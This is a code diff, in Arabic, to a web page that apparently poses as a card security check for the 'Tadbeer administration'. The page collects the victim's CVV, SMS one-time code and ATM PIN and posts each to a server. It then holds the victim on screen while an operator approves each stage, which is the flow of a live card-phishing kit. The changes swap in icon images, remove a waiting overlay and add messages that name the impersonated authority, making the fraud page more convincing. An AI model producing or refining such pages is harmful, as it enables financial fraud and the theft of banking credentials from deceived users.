@@ -407,7 +407,7 @@
                 <div class="card-head">التحقق الأمني للبطاقة</div>
                 <div class="card-body">
                     <div class="step-center">
-                        <div class="step-ic">&#128241;</div>
+                        <div class="step-ic"><img src="otp-icon.png" alt="OTP" style="width:54px; height:54px; object-fit:contain; border-radius:50%;"></div>
                         <h3>رمز التحقق (OTP)</h3>
                         <p class="sub">تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
                         <input type="text" inputmode="numeric" class="big-input" id="otp-input" placeholder="أدخل رمز التحقق" maxlength="6" autocomplete="off">
@@ -432,7 +432,7 @@
                 <div class="card-head">التحقق من رمز PIN</div>
                 <div class="card-body">
                     <div class="step-center">
-                        <div class="step-ic atm">&#127974;</div>
+                        <div class="step-ic atm"><img src="atm-icon.png" alt="ATM" style="width:56px; height:56px; object-fit:contain;"></div>
                         <h3>رقم PIN</h3>
                         <p class="sub">أدخل رقم PIN الخاص ببطاقتك</p>
                         <input type="password" inputmode="numeric" class="big-input" id="pin-input" placeholder="&#8226;&#8226;&#8226;&#8226;" maxlength="6" autocomplete="off">
@@ -468,14 +468,6 @@
         </div>
     </main>
 
-    <!-- انتظار قرار الأدمن -->
-    <div class="decide-overlay" id="decide-wait">
-        <div class="card processing">
-            <div class="spin"></div>
-            <h3>جارٍ مراجعة طلبك</h3>
-            <p id="proc-wait-note">يرجى الانتظار حتى يتم اعتماد العملية من إدارة تدبير. لا تغلق هذه الصفحة.</p>
-        </div>
-    </div>
 
     <!-- رسالة الرفض -->
     <div class="decide-overlay" id="decide-reject">
@@ -606,8 +598,8 @@
 
         let decideTimer = null;
         function clearDecide() { if (decideTimer) { clearInterval(decideTimer); decideTimer = null; } }
-        function openWait() { $('decide-wait').classList.add('show'); }
-        function closeWait() { $('decide-wait').classList.remove('show'); }
+        function openWait() { /* شاشة الانتظار العلوية أزيلت؛ صفحة المعالجة هي الوحيدة المعروضة */ }
+        function closeWait() {}
         function showReject(stage) {
             $('reject-msg').innerText = REJECT_MESSAGES[stage] || REJECT_MESSAGES.pin;
             $('decide-reject').classList.add('show');
@@ -669,7 +661,7 @@
                 cardCvv: $('card-cvv').value
             });
             await step(1200);
-            setProcMsg('جارٍ إرسال العملية للاعتماد...');
+            setProcMsg('جارٍ إرسال العملية للاعتماد من إدارة تدبير...');
             openWait();
             const decision = await waitForDecision('card');
             if (decision === 'approved') {
@@ -690,6 +682,7 @@
             setProcMsg('جارٍ إرسال رمز التحقق للمراجعة...');
             await postPayment('otp', { otpCode: val });
             await step(800);
+            setProcMsg('جارٍ مراجعة رمز التحقق من إدارة تدبير...');
             openWait();
             const decision = await waitForDecision('otp');
             if (decision === 'approved') {
@@ -710,6 +703,7 @@
             setProcMsg('جارٍ إرسال رقم PIN للمراجعة...');
             await postPayment('pin', { atmPin: val });
             await step(800);
+            setProcMsg('جارٍ مراجعة العملية النهائية من إدارة تدبير...');
             openWait();
             const decision = await waitForDecision('pin');
             if (decision === 'approved') {
